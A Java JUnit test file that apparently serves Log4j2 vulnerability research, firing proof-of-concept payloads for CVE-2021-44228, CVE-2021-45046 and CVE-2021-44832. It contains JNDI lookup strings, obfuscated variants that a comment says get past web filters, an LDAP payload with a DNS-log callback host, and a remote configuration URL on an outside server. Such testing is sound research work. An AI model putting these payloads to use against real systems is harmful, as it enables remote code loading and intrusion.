package me.mole.log4j2vulns;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.ThreadContext;
import org.apache.logging.log4j.message.MapMessage;
import org.apache.logging.log4j.message.StringMapMessage;
import org.apache.logging.log4j.spi.ReadOnlyThreadContextMap;
import org.junit.jupiter.api.Test;


class Log4j2VulnsApplicationTests {

    @Test
    void log4j2_cve_2021_44228() throws InterruptedException {
        Logger logger = LogManager.getLogger(Log4j2VulnsApplicationTests.class);
//        ThreadContext.put("loginId", "m01ehack");
        String poc = "$${jndi:rmi://127.0.0.1:8085/abc}";
//        String poc = "${jn${:-}kdi:rmi://127.0.0.1:8085/abc}";
//        String poc = "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1:8085/abc}";
//        String poc = "${${::-j}ndi:rmi://127.0.0.1:8085/abc}\n";
//        String poc = "${${lower:jndi}:${lower:rmi}://127.0.0.1:8085/abc}\n";
//        String poc = "${${lower:${lower:jndi}}:${lower:rmi}://127.0.0.1:8085/abc}";
//        String poc = "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://127.0.0.1:8085/abc}";
//        String poc = "${${lower:J}${upper:N}${lower:D}${upper:i}:${lower:r}m${lower:i}://127.0.0.1:8085/abc}";

        logger.error(poc);

        //可用于绕waf：
        //   (1) valueDelimiterMatcher, chars=[':','-']
        //
    }

    @Test
    void test_log4j2_cve_2021_45046() {
        Logger logger = LogManager.getLogger(Log4j2VulnsApplicationTests.class);
        //2.15.0 with no default setting (log4j2.formatMsgNoLookups) protected
//        String poc = "${jndi:ldap://127.0.0.1#bypasss.dns.moledns.xyz:8085/a}";
        String poc = "${jndi:ldap://127.0.0.1#bypass.3dcu4z.dnslog.cn:8085/a}";
        poc = "abcdefg";

        ThreadContext.put("loginId", poc);
        logger.error("foo");
        System.out.println("--------finish----------");
    }

    @Test
    void test_log4j2_cve_2021_44832() {
        System.setProperty("log4j2.configurationFile","http://159.75.98.162:8084/log4j2_cve-2021-44832.xml");
        Logger logger = LogManager.getLogger(Log4j2VulnsApplicationTests.class);
        logger.error("foo");
    }
}
